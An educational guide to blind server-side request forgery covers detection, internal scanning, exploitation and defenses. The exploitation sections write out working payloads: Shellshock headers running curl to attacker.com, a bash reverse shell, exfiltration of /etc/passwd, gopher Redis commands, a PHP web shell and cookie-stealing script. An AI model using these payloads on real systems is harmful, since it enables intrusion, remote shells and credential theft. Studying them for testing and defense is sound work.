# Blind SSRF vulnerabilities (comprehensive guide)

Blind Server-Side Request Forgery (Blind SSRF) is a variant of SSRF where the application can be induced to make HTTP requests to attacker-specified URLs, but the response from those requests is never returned to the attacker in the application's front-end response. Unlike standard SSRF where responses are visible, blind SSRF requires out-of-band detection techniques and indirect exploitation methods. While harder to exploit than regular SSRF, blind SSRF can still lead to critical vulnerabilities including remote code execution through techniques like Shellshock exploitation, HTTP client-side attacks, and blind vulnerability sweeping of internal infrastructure.

The key difference: **you can make the server reach out, but you can't see what it retrieves**—exploitation relies on side channels, timing, and external monitoring.

## What is blind SSRF? (fundamentals)

### Standard SSRF vs. Blind SSRF

**Standard SSRF (response visible):**
```
Attacker → Application → Internal Admin Panel
                      ← Response returned to attacker

Attacker sees:
<h1>Admin Panel</h1>
<a href="/delete-user">Delete User</a>
```

**Blind SSRF (response not visible):**
```
Attacker → Application → Internal Admin Panel
                      ← Response discarded/not returned

Attacker sees:
"Request processed successfully" (generic message)
```

**The challenge:** Cannot directly read responses from internal systems.

### Common blind SSRF scenarios

**Scenario 1: Analytics/logging without display**
```python
@app.route('/report-url', methods=['POST'])
def report_url():
    url = request.form['url']
    
    # Application makes request
    try:
        response = requests.get(url, timeout=5)
        # Response logged internally but NOT returned
        log_analytics(url, response.status_code)
    except:
        pass
    
    return "Thank you for your report!"  # Generic message
```

**Scenario 2: Webhook/callback processing**
```python
@app.route('/register-webhook', methods=['POST'])
def register_webhook():
    webhook_url = request.form['url']
    
    # Application tests webhook by making request
    try:
        requests.post(webhook_url, json={'test': 'data'})
    except:
        pass
    
    return "Webhook registered"  # No indication of what happened
```

**Scenario 3: Referer tracking**
```python
@app.route('/page')
def page():
    referer = request.headers.get('Referer')
    
    # Analytics service fetches referer page
    if referer:
        analytics.fetch_and_analyze(referer)  # Background processing
    
    return render_template('page.html')
```

**Scenario 4: Link preview generation**
```python
@app.route('/preview-link', methods=['POST'])
def preview_link():
    url = request.form['url']
    
    # Fetch page to generate preview
    try:
        response = requests.get(url)
        # Extract metadata (title, description)
        metadata = extract_metadata(response.text)
        # Store in database, but don't show raw response
    except:
        metadata = {'title': 'Unable to fetch'}
    
    return "Preview generated"
```

### Impact differences

**Standard SSRF impact:**
- Access internal admin panels
- Read internal API responses
- Access cloud metadata services
- Port scan with response data

**Blind SSRF impact (more limited):**
- Confirm internal services exist (via timing/out-of-band)
- Trigger exploits in vulnerable services (Shellshock, XXE)
- Exploit HTTP client vulnerabilities
- Blind port scanning
- DoS internal services

## Detection techniques

### Technique 1: Out-of-band (OAST) detection

**Concept:** Make server reach out to attacker-controlled system and monitor for incoming connections.

#### Using Burp Collaborator

**Step 1: Generate Collaborator domain**
```
Burp Suite → Burp menu → Burp Collaborator client
Click "Copy to clipboard"

Result: unique-id.burpcollaborator.net
```

**Step 2: Inject Collaborator URL**
```http
POST /report-url HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

url=http://unique-id.burpcollaborator.net
```

**Step 3: Poll Collaborator for interactions**
```
Burp Collaborator client → Poll now

Results:
[+] DNS lookup from 203.0.113.50
[+] HTTP request from 203.0.113.50
    GET / HTTP/1.1
    Host: unique-id.burpcollaborator.net
    User-Agent: Python-requests/2.25.1
```

**Confirmation:** Blind SSRF exists! Server made outbound request.

#### Using custom server

**Setup listener:**
```bash
# Simple Python HTTP server with logging
python3 -m http.server 80

# Or netcat
nc -lvnp 80
```

**Or use online services:**
- webhook.site
- requestbin.com
- interact.sh

**Inject URL:**
```http
POST /report-url HTTP/1.1

url=http://attacker.com:80/test
```

**Monitor logs:**
```
Serving HTTP on 0.0.0.0 port 80 ...
203.0.113.50 - - [18/Feb/2026 19:23:01] "GET /test HTTP/1.1" 200 -
```

**Blind SSRF confirmed!**

#### Lab: Blind SSRF with out-of-band detection

**Scenario:** Analytics tracking via Referer header.

**Test with Collaborator:**
```http
GET /analytics HTTP/1.1
Host: target.com
Referer: http://unique-id.burpcollaborator.net
```

**Check Burp Collaborator:**
```
[+] DNS lookup from target server
[+] HTTP GET request
    GET / HTTP/1.1
    User-Agent: Mozilla/5.0 (analytics-bot)
```

**Result:** Server fetches Referer URLs for analytics (blind SSRF via Referer).

### Technique 2: DNS-only exfiltration

**Common pattern:** DNS lookups succeed but HTTP blocked by firewall.

**Why it happens:**
```
Network architecture:
- Outbound DNS: Allowed (port 53)
- Outbound HTTP: Blocked (ports 80/443 to unexpected destinations)

Result:
DNS lookup: target.com → Success
HTTP request to target.com → Blocked by firewall
```

**Exploitation strategy:** Use DNS for data exfiltration.

**DNS tunneling example:**
```http
POST /report-url HTTP/1.1

url=http://stolen-data-here.attacker.com
```

**DNS query generated:**
```
DNS lookup for: stolen-data-here.attacker.com
```

**Attacker's DNS server receives:**
```
Query: stolen-data-here.attacker.com
From: 203.0.113.50
```

**Advanced: Exfiltrate data via subdomain:**
```python
# If you control the vulnerable parameter injection
# Inject: http://{secret-data}.attacker.com

# When server processes:
import requests
secret = get_secret_data()
url = f"http://{secret}.attacker.com"
requests.get(url)  # HTTP blocked, but DNS lookup happens!

# DNS log shows:
# Query: AWS_KEY_abc123xyz.attacker.com
```

### Technique 3: Time-based detection

**Principle:** Measure response time differences.

**Test 1: Open vs. closed ports**
```http
POST /report-url HTTP/1.1

url=http://192.168.1.100:80
```

**Timing:**
```
Open port (service running):
Response time: 100ms (connection accepted quickly)

Closed port:
Response time: 5000ms (connection timeout after 5 seconds)
```

**Automation with Burp Intruder:**
```http
POST /report-url HTTP/1.1

url=http://192.168.1.100:§8000§
```

**Payload:** Numbers 1-65535 (port scan)

**Columns → Add → Response received/completed (timestamp)**

**Analysis:**
```
Port 80:   100ms → Open
Port 443:  110ms → Open
Port 22:   105ms → Open
Port 3306: 5000ms → Closed (timeout)
Port 6379: 120ms → Open (Redis!)
```

**Test 2: Exploiting sleep/delay**

**If vulnerable service has command injection:**
```http
POST /report-url HTTP/1.1

url=http://192.168.1.100/cgi-bin/vulnerable.sh?cmd=sleep+10
```

**Timing:**
```
Without sleep: 200ms
With sleep 10: 10,200ms

Difference confirms command execution!
```

## Exploitation techniques

### Technique 1: Blind internal infrastructure scanning

**Goal:** Map internal network without seeing responses.

**Strategy:** Sweep IP ranges, detect existence via out-of-band callbacks.

**Setup payload server:**
```python
# exploit-server.py
from flask import Flask, request
import logging

app = Flask(__name__)

@app.route('/<path:path>')
def log_callback(path):
    source_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    print(f"[+] Callback from {source_ip}")
    print(f"    Path: /{path}")
    print(f"    User-Agent: {user_agent}")
    
    # Return exploit payload if needed
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

**Burp Intruder configuration:**
```http
POST /report-url HTTP/1.1

url=http://192.168.0.§1§:8080/vulnerable?callback=http://attacker.com/found-§1§
```

**Payloads:**
```
Position 1: Numbers 1-255 (IP range)
```

**Monitor exploit server logs:**
```
[+] Callback from 203.0.113.50
    Path: /found-68
    
[+] Callback from 203.0.113.50
    Path: /found-100
```

**Conclusion:** Hosts 192.168.0.68 and 192.168.0.100 exist with vulnerable service!

### Technique 2: Shellshock exploitation

**Shellshock vulnerability (CVE-2014-6271):** Bash code injection via HTTP headers.

**Vulnerable CGI script:**
```bash
#!/bin/bash
echo "Content-type: text/html"
echo ""
echo "<html><body>Hello</body></html>"
```

**When Bash processes HTTP headers, vulnerable to:**
```
User-Agent: () { :; }; /bin/bash -c 'commands here'
```

#### Exploitation via blind SSRF

**Step 1: Identify internal CGI servers**

**Inject payload:**
```http
POST /report-url HTTP/1.1

url=http://192.168.0.1/cgi-bin/status
```

**Common CGI paths:**
```
/cgi-bin/status
/cgi-bin/admin.cgi
/cgi-bin/printenv
/cgi-bin/test-cgi
```

**Step 2: Craft Shellshock payload with callback**

**Payload structure:**
```
User-Agent: () { :; }; /usr/bin/curl http://attacker.com/$(whoami)
```

**But how to inject User-Agent via blind SSRF?**

**If application allows custom headers:**
```http
POST /report-url HTTP/1.1

url=http://192.168.0.68/cgi-bin/status
headers=User-Agent: () { :; }; curl http://attacker.com/pwned
```

**Or exploit via Referer (some CGI scripts use Referer in bash):**
```
Referer: () { :; }; curl http://attacker.com/shellshocked
```

**Step 3: Receive callback**

**Attacker server receives:**
```
GET /pwned HTTP/1.1
Host: attacker.com
User-Agent: curl/7.68.0
```

**Confirmation:** Shellshock exploited!

**Step 4: Escalate to reverse shell**

**Payload:**
```bash
() { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**URL-encoded for SSRF:**
```
User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

**Listener:**
```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received from 192.168.0.68
bash-4.2$ whoami
www-data
bash-4.2$ 
```

**Full RCE achieved via blind SSRF!**

#### Lab: Blind SSRF with Shellshock exploitation

**Scenario:** Application checks product availability via internal server running vulnerable CGI.

**Step 1: Test for blind SSRF with Collaborator**
```http
POST /product/stock HTTP/1.1

stockApi=http://unique-id.burpcollaborator.net
```

**Result:** DNS and HTTP callback received.

**Step 2: Scan internal network**
```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.§1§:8080
```

**Burp Intruder:** Payload 1-255

**Timing analysis:**
```
192.168.0.68:8080 → Fast response (service exists)
```

**Step 3: Test for Shellshock**
```http
POST /product/stock HTTP/1.1
Referer: () { :; }; curl http://unique-id.burpcollaborator.net/shellshock

stockApi=http://192.168.0.68:8080/product/stock/check?productId=1&storeId=1
```

**Collaborator poll:**
```
[+] HTTP request
    GET /shellshock HTTP/1.1
    User-Agent: curl/7.58.0
```

**Shellshock confirmed!**

**Step 4: Exfiltrate data**
```http
Referer: () { :; }; curl http://unique-id.burpcollaborator.net/$(whoami)
```

**Collaborator receives:**
```
GET /root HTTP/1.1
```

**User is root!**

**Step 5: Read sensitive file**
```http
Referer: () { :; }; curl http://unique-id.burpcollaborator.net/exfil --data "$(cat /etc/passwd)"
```

**Collaborator receives POST with /etc/passwd content.**

### Technique 3: Exploiting HTTP client vulnerabilities

**Concept:** Poison server's HTTP client library via malicious responses.

**Attack flow:**
```
1. Attacker controls malicious server
2. Blind SSRF makes target server request attacker's server
3. Attacker returns malicious HTTP response
4. Vulnerable HTTP client on target server processes response
5. Exploitation: Memory corruption, RCE
```

#### Example: HTTP response smuggling

**Vulnerable HTTP client:** Doesn't properly validate Content-Length.

**Malicious server returns:**
```http
HTTP/1.1 200 OK
Content-Length: 10

AAAAAAAAAA
POST /admin/delete-user HTTP/1.1
Host: internal.local
...
```

**If target server's HTTP client:**
1. Reads 10 bytes ("AAAAAAAAAA")
2. Keeps connection open
3. Reuses connection for next request
4. Malicious POST request smuggled into connection
5. Internal server processes smuggled delete-user request

#### Example: CRLF injection in HTTP client

**If HTTP client doesn't sanitize headers:**

**Attacker-controlled response:**
```http
HTTP/1.1 301 Redirect
Location: http://internal.local/
Set-Cookie: admin=true
```

**If target makes follow-up request with this cookie → privilege escalation.**

#### Example: XXE via HTTP response (rare)

**If HTTP client parses XML responses with external entities enabled:**

**Malicious XML response:**
```xml
HTTP/1.1 200 OK
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>&xxe;</response>
```

**Result:** XXE exploitation via blind SSRF response.

### Technique 4: Exploiting other services (beyond HTTP)

**If application supports multiple protocols:**

**Redis exploitation (protocol smuggling):**
```
url=gopher://192.168.0.100:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

Sends Redis commands via gopher protocol
```

**Memcached exploitation:**
```
url=gopher://192.168.0.200:11211/_stats%0aquit%0a

Gathers memcached statistics
```

**SMTP exploitation (email sending):**
```
url=smtp://192.168.0.50/
Content: EHLO attacker.com
MAIL FROM: attacker@evil.com
RCPT TO: victim@company.com
DATA
Subject: Phishing
...
```

**MySQL exploitation (if MySQL connector used):**
```
url=mysql://192.168.0.100:3306/

If application uses vulnerable MySQL client,
can trigger arbitrary file read
```

## Advanced blind SSRF exploitation

### Strategy 1: Chaining vulnerabilities

**Blind SSRF + Stored XSS:**
```
1. Blind SSRF to internal admin panel
2. Admin panel has stored XSS vulnerability
3. SSRF payload:
   http://192.168.0.68/admin/add-comment?comment=<script>document.location='http://attacker.com/'+document.cookie</script>
   
4. Next time admin views page, XSS triggers
5. Admin's session cookie sent to attacker
```

**Blind SSRF + SQLi:**
```
1. Blind SSRF to internal API
2. API has SQL injection
3. SSRF payload:
   http://192.168.0.100/api/user?id=1' UNION SELECT password FROM admins--
   
4. Even though response not visible to attacker,
   SQL injection executed
5. If SQLi can trigger DNS exfiltration:
   http://192.168.0.100/api/user?id=1' UNION SELECT load_file(CONCAT('\\\\',password,'.attacker.com\\a'))--
   
6. DNS query for: admin_password.attacker.com
```

### Strategy 2: Time-based exploitation validation

**Test for successful exploitation via timing:**

**Example: File upload via blind SSRF**
```http
POST /report-url HTTP/1.1

url=http://192.168.0.68/admin/upload?file=backdoor.php&content=<?php system($_GET['cmd']); ?>
```

**Validation:**
```http
POST /report-url HTTP/1.1

url=http://192.168.0.68/backdoor.php?cmd=sleep+5
```

**Timing:**
```
Without sleep: 200ms
With sleep 5: 5200ms

Success! Backdoor uploaded and executed.
```

### Strategy 3: Cloud metadata via blind SSRF

**Even without seeing response:**

**Trigger cloud metadata fetch with callback:**
```http
POST /report-url HTTP/1.1

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/?callback=http://attacker.com
```

**If service supports callbacks, credentials sent to attacker!**

**Alternative: DNS exfiltration**
```
If vulnerable service allows command injection:
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name?cmd=curl $(cat role-name).attacker.com

DNS query for: ASIA_ACCESS_KEY_ABC123.attacker.com
```

## Prevention strategies

### Defense Layer 1: Disable unnecessary features

**Disable redirects:**
```python
response = requests.get(user_url, allow_redirects=False)
```

**Disable unused protocols:**
```python
# Only allow HTTP/HTTPS
from urllib.parse import urlparse

allowed_schemes = ['http', 'https']
parsed = urlparse(url)

if parsed.scheme not in allowed_schemes:
    raise ValueError("Protocol not allowed")
```

### Defense Layer 2: Network segregation

**Application server should not have direct access to:**
- Internal admin panels
- Cloud metadata services (169.254.169.254)
- Internal databases
- Sensitive internal APIs

**Implement egress filtering:**
```
Firewall rules:
- Block outbound to 127.0.0.0/8
- Block outbound to 10.0.0.0/8
- Block outbound to 192.168.0.0/16
- Block outbound to 169.254.0.0/16
- Block outbound to 172.16.0.0/12
- Allow only specific external IPs/domains
```

### Defense Layer 3: Input validation

**Even for blind SSRF:**
```python
def validate_url(url):
    from urllib.parse import urlparse
    import socket
    import ipaddress
    
    parsed = urlparse(url)
    
    # Validate protocol
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    
    # Resolve hostname
    try:
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)
        
        # Block private IPs
        if not ip_obj.is_global:
            raise ValueError("Private IP not allowed")
            
    except socket.gaierror:
        raise ValueError("Cannot resolve hostname")
    
    return True
```

### Defense Layer 4: Authentication for internal requests

**Don't rely on source IP for authentication:**
```python
# BAD: Trust all localhost requests
if request.remote_addr == '127.0.0.1':
    return admin_panel()  # No auth required!

# GOOD: Always require authentication
if not is_authenticated(request):
    return "Unauthorized", 401

if not is_admin(current_user):
    return "Forbidden", 403

return admin_panel()
```

### Defense Layer 5: Monitoring and detection

**Monitor for suspicious outbound requests:**
```
Alert on:
- Requests to metadata service (169.254.169.254)
- Requests to localhost
- Requests to private IP ranges
- Unusual outbound connections
- High volume of DNS queries
- Outbound requests to user-controlled domains
```

**Logging:**
```python
import logging

def make_external_request(url):
    logger.info(f"External request initiated: {url}")
    logger.info(f"User: {current_user.id}")
    logger.info(f"Source IP: {request.remote_addr}")
    
    try:
        response = requests.get(url, timeout=5)
        logger.info(f"Response status: {response.status_code}")
    except Exception as e:
        logger.error(f"Request failed: {e}")
```

### Defense Layer 6: Least privilege for application

**Run application with minimal permissions:**
```bash
# Don't run as root
useradd -r -s /bin/false webapp
su webapp -c 'python app.py'

# Limit network access at OS level
iptables -A OUTPUT -m owner --uid-owner webapp -d 169.254.169.254 -j DROP
iptables -A OUTPUT -m owner --uid-owner webapp -d 10.0.0.0/8 -j DROP
```
